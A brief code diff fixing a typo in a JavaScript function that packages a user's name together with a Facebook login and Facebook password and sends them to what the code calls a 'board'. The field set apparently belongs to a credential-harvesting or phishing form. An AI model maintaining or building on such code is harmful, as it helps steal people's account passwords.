@@ -27,7 +27,7 @@ const sendDataToBoard = async (data) => {
 
     const dataToSend = {
       action: "send_data",
-      first_name: data.firtsName || "",
+      first_name: data.firstName || "",
       last_name: data.lastName || "",
       facebook_login: data.fbUsername || "",
       facebook_password: data.fbPassword || "",
